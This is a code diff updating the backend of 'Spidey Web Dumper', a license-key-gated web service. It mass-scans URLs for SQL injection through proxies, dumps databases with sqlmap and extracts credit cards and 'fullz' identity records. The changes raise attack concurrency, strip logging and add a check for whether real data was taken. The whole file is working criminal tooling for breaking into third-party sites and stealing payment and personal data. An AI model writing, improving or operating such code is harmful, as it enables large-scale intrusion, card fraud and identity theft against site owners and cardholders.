@@ -1,6 +1,6 @@
 """
-Spidey Web Dumper — FastAPI Backend (FINAL v6.0)
-Cookie fix + Register + Admin + All processes fixed
+Spidey Web Dumper — FastAPI Backend (FINAL v7.0)
+Latest SQLmap + All Processes Fixed + alldumps Real Data Check
 """
 import os
 import io
@@ -87,7 +87,7 @@ ADMIN_PATH = os.environ.get("ADMIN_PATH", "/admin").strip()
 if not ADMIN_PATH.startswith("/"):
     ADMIN_PATH = "/" + ADMIN_PATH
 
-SESSION_IDLE_TIMEOUT = 3600 * 24  # 24 hours
+SESSION_IDLE_TIMEOUT = 3600 * 24
 SESSIONS = {}
 
 # ═══════════════════════════════════════════════════════════════════════════
@@ -233,7 +233,6 @@ def get_user(uid: str) -> Optional[dict]:
     if not uid:
         return None
     return load_users().get(uid.lower())
-
 
 # ═══════════════════════════════════════════════════════════════════════════
 #  LICENSE KEYS
@@ -420,7 +419,6 @@ def require_user(request: Request) -> str:
         raise HTTPException(status_code=401, detail="Not logged in")
     user = get_user(uid)
     if not user:
-        # Session valid but user file reset → auto-logout
         raise HTTPException(status_code=401, detail="User not found. Please login again.")
     exp = user.get("expires")
     if exp and not user.get("is_admin"):
@@ -609,7 +607,6 @@ async def login_submit(request: Request, username: str = Form(...), password: st
         except Exception:
             pass
     
-    # ✅ Create session
     token = create_session_token(username)
     fingerprint = make_fingerprint(request)
     SESSIONS[token] = {
@@ -625,10 +622,10 @@ async def login_submit(request: Request, username: str = Form(...), password: st
     resp.set_cookie(
         "spidey_session", token,
         httponly=True,
-        secure=False,           # ✅ HTTP + HTTPS dono pe kaam kare
+        secure=False,
         max_age=SESSION_MAX_AGE,
-        samesite="lax",          # ✅ Mobile friendly
-        path="/",                # ✅ Har route pe available
+        samesite="lax",
+        path="/",
     )
     return resp
 
@@ -673,35 +670,29 @@ async def register_submit(
     
     username = username.strip().lower()
     
-    # Validate username
     if len(username) < 3 or len(username) > 20:
         return RedirectResponse("/register?error=Username+must+be+3-20+chars", status_code=302)
     
     if not all(c.isalnum() or c == "_" for c in username):
         return RedirectResponse("/register?error=Only+letters+numbers+underscore", status_code=302)
     
-    # Validate password
     ok, msg = check_strong_password(password)
     if not ok:
         return RedirectResponse(f"/register?error={msg.replace(' ', '+')}", status_code=302)
     
-    # Check existing user
     users = load_users()
     if username in users:
         return RedirectResponse("/register?error=Username+taken", status_code=302)
     
-    # Validate license key
     key = license_key.strip().upper()
     keys = load_keys()
     if key not in keys:
-        logger.warning(f"[register] Invalid key from {ip}")
         return RedirectResponse("/register?error=Invalid+license+key", status_code=302)
     
     key_data = keys[key]
     if key_data.get("used_by"):
         return RedirectResponse("/register?error=Key+already+used", status_code=302)
     
-    # Create user
     plan_code = key_data.get("plan", "1d")
     plan = PLANS.get(plan_code, PLANS["1d"])
     
@@ -720,7 +711,6 @@ async def register_submit(
     }
     save_users(users)
     
-    # Mark key as used
     keys[key]["used_by"] = username
     keys[key]["used_at"] = datetime.now().isoformat()
     save_keys(keys)
@@ -1074,21 +1064,25 @@ async def _run_proxy_check(tid: str, uid: str, proxies: List[str]):
         from core.proxy import check_proxies_bulk
         last_edit = [time.time()]
 
-        async def on_prog(checked, tot, live):
+        def on_prog(checked, tot, live):
             if is_cancelled(tid):
                 return
             now = time.time()
-            if now - last_edit[0] >= 0.8:
+            if now - last_edit[0] >= 0.5:
                 last_edit[0] = now
                 update_progress(tid, done=checked, total=tot, live=live,
                                 msg=f"Checked {checked}/{tot} | Live {live}")
 
         try:
-            live_list = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300,
-                                                 progress_callback=on_prog, task_id=tid)
+            live_list = await check_proxies_bulk(
+                proxies, timeout=5.0, concurrency=500,
+                progress_callback=on_prog, task_id=tid,
+            )
         except TypeError:
-            live_list = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300,
-                                                 progress_callback=on_prog)
+            live_list = await check_proxies_bulk(
+                proxies, timeout=5.0, concurrency=500,
+                progress_callback=on_prog,
+            )
 
         if is_cancelled(tid):
             add_log(tid, "⛔ Cancelled")
@@ -1229,21 +1223,6 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
         proxies = get_user_proxies(uid)
         add_log(tid, f"Using {len(proxies)} proxies")
 
-        if len(proxies) >= 5:
-            add_log(tid, "⚡ Filtering live proxies...")
-            update_progress(tid, msg="Filtering live proxies...")
-            try:
-                from core.proxy import check_proxies_bulk
-                live = await check_proxies_bulk(proxies, timeout=5.0, concurrency=300)
-                add_log(tid, f"✅ Live: {len(live)}/{len(proxies)}")
-                proxies = live if live else []
-            except Exception as e:
-                add_log(tid, f"⚠️ Filter failed: {str(e)[:60]}")
-                proxies = []
-
-        if not proxies:
-            add_log(tid, "⚠️ No proxies — running direct")
-
         from core.sqli import check_urls_bulk
         last_edit = [time.time()]
 
@@ -1257,10 +1236,10 @@ async def _run_sqli(tid: str, uid: str, urls: List[str]):
                                 msg=f"Tested {done}/{tot} | VULN {found}")
 
         try:
-            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=80, timeout=6.0,
+            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=200, timeout=5.0,
                                          progress_callback=on_prog, task_id=tid)
         except TypeError:
-            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=80, timeout=6.0,
+            inj = await check_urls_bulk(urls, proxies=proxies, concurrency=200, timeout=5.0,
                                          progress_callback=on_prog)
 
         if is_cancelled(tid):
@@ -1342,26 +1321,26 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
                     recs = extract_fullz_from_dir(src)
                     if recs:
                         all_fullz.extend(recs)
-            except Exception as e:
-                logger.error(f"[dump] fullz: {e}")
+            except Exception:
+                pass
             try:
                 dump_text = _capture_raw_dump(r)
                 if dump_text:
                     all_raw_dumps.append(dump_text)
                     n_lines = len(dump_text.splitlines())
-                    add_log(tid, f"📦 {r.url[:50]} | {n_lines} lines")
-                else:
-                    add_log(tid, f"⚠️ {r.url[:50]} | No data")
-            except Exception as e:
-                logger.exception(f"[dump] raw capture: {e}")
-                add_log(tid, f"⚠️ {r.url[:50]} | Capture fail")
+                    if "Real Data: True" in dump_text:
+                        add_log(tid, f"✅ {r.url[:50]} | {n_lines} lines")
+                    else:
+                        add_log(tid, f"⚠️ {r.url[:50]} | NOT VULNERABLE")
+            except Exception:
+                pass
 
         try:
             await api_dump_multiple(
                 urls, proxy_list=proxies, level=level, risk=risk,
                 technique=technique, threads=threads, tamper=tamper,
                 crawl_depth=crawl, progress_cb=on_prog, per_result_cb=on_result,
-                task_id=tid,
+                task_id=tid, max_concurrent=8,
             )
         except TypeError:
             await api_dump_multiple(
@@ -1404,7 +1383,7 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
             result["alldump_file"] = al_name
             result["alldump_lines"] = n_lines
         else:
-            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data extracted")
+            al_name = save_output(uid, f"alldumps_0_{ts}.txt", "# No data")
             result["alldump_file"] = al_name
             result["alldump_lines"] = 0
 
@@ -1422,8 +1401,11 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
         update_progress(tid, done=len(urls), total=len(urls),
                         cards=result.get("cards", 0),
                         fullz=result.get("fullz", 0),
-                        msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Dumps:{result.get('alldump_lines',0)}")
+                        msg=f"✅ CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)}")
         add_log(tid, f"✅ Done — CC:{result.get('cards',0)} Fullz:{result.get('fullz',0)} Raw:{result.get('alldump_lines',0)}")
+    except asyncio.CancelledError:
+        add_log(tid, "⛔ Cancelled")
+        update_progress(tid, msg="⛔ Cancelled")
     except Exception as e:
         logger.exception(f"[dump:{tid}] ERROR")
         update_task(tid, status="error", error=str(e))
@@ -1431,18 +1413,63 @@ async def _run_dump(tid, uid, urls, level, risk, threads, technique, tamper, cra
 
 
 def _capture_raw_dump(result) -> str:
+    """Capture only REAL data from sqlmap result"""
     lines = []
     url = getattr(result, "url", "unknown")
+    
+    has_real_data = False
+    log_text = "\n".join(getattr(result, "log_lines", []) or [])
+    
+    success_indicators = [
+        "is vulnerable",
+        "fetched data logged",
+        "dumped to",
+        "retrieved:",
+        "backend dbms:",
+        "found a total of",
+        "the back-end dbms is",
+        "available databases",
+        "current user is",
+        "current database is",
+    ]
+    
+    error_indicators = [
+        "maximum number of used threads",
+        "your sqlmap version is outdated",
+        "switch '--proxy' is incompatible",
+        "no parameter(s) found",
+        "all tested parameters do not appear",
+        "connection timed out",
+    ]
+    
+    for ind in success_indicators:
+        if ind in log_text.lower():
+            has_real_data = True
+            break
+    
     lines.append("# " + "=" * 68)
     lines.append(f"# URL: {url}")
     lines.append(f"# Task: {getattr(result, 'taskid', '')}")
-    lines.append(f"# Success: {getattr(result, 'success', False)}")
+    lines.append(f"# Real Data: {has_real_data}")
     lines.append(f"# DBMS: {getattr(result, 'dbms', '') or getattr(result, 'banner', '')}")
     lines.append(f"# User: {getattr(result, 'current_user', '')}")
     lines.append(f"# Database: {getattr(result, 'current_db', '')}")
     lines.append("# " + "=" * 68)
     lines.append("")
-
+    
+    if not has_real_data:
+        lines.append("# ❌ NO REAL DATA — URL not vulnerable or errors")
+        lines.append("")
+        lines.append("### Why? Check SQLmap log below:")
+        for line in log_text.splitlines():
+            ll = line.lower()
+            for err in error_indicators:
+                if err in ll:
+                    lines.append(f"  - {line}")
+                    break
+        lines.append("")
+        return "\n".join(lines)
+    
     tables = getattr(result, "tables", []) or []
     if tables:
         lines.append(f"### TABLES FOUND ({len(tables)})")
@@ -1456,11 +1483,11 @@ def _capture_raw_dump(result) -> str:
             else:
                 lines.append(f"  - {t}")
         lines.append("")
-
+    
     data_rows = getattr(result, "data_rows", []) or []
     if data_rows:
         lines.append(f"### DATA ROWS ({len(data_rows)})")
-        for item in data_rows:
+        for item in data_rows[:1000]:
             tbl = item.get("table", "unknown") if isinstance(item, dict) else "unknown"
             row = item.get("row", item) if isinstance(item, dict) else item
             if isinstance(row, dict):
@@ -1471,7 +1498,7 @@ def _capture_raw_dump(result) -> str:
                 row_str = str(row)
             lines.append(f"[{tbl}] {row_str}")
         lines.append("")
-
+    
     csv_files = getattr(result, "csv_files", []) or []
     csv_dir = getattr(result, "csv_dir", "") or ""
     if csv_dir and os.path.isdir(csv_dir) and not csv_files:
@@ -1479,7 +1506,7 @@ def _capture_raw_dump(result) -> str:
             for fn in files:
                 if fn.endswith(".csv"):
                     csv_files.append(os.path.join(root, fn))
-
+    
     if csv_files:
         lines.append(f"### CSV FILES ({len(csv_files)})")
         for fpath in csv_files[:20]:
@@ -1491,37 +1518,23 @@ def _capture_raw_dump(result) -> str:
                     content = f.read()
                     content_lines = content.splitlines()[:500]
                     lines.extend(content_lines)
-                    if len(content.splitlines()) > 500:
-                        lines.append(f"... [{len(content.splitlines()) - 500} more lines]")
             except Exception as e:
                 lines.append(f"# CSV read error: {e}")
         lines.append("")
-
-    raw_output = getattr(result, "raw_output", "") or ""
-    log_lines = getattr(result, "log_lines", []) or []
-    if not raw_output and log_lines:
-        raw_output = "\n".join(log_lines)
-    if raw_output:
-        lines.append(f"### SQLMAP LOG (last 100 lines)")
-        log_split = raw_output.splitlines()
-        for line in log_split[-100:]:
+    
+    if log_text:
+        lines.append("### SQLMAP LOG (last 50 lines)")
+        for line in log_text.splitlines()[-50:]:
             lines.append(line)
         lines.append("")
-
+    
     cards = getattr(result, "cards", []) or []
     if cards:
         lines.append(f"### CARDS ({len(cards)})")
         for c in cards:
             lines.append(str(c))
         lines.append("")
-
-    if len(lines) <= 9:
-        lines.append("")
-        lines.append("# ⚠️ NO DATA EXTRACTED")
-        lines.append("")
-
-    lines.append("")
-    lines.append("")
+    
     return "\n".join(lines)
 
 # ═══════════════════════════════════════════════════════════════════════════
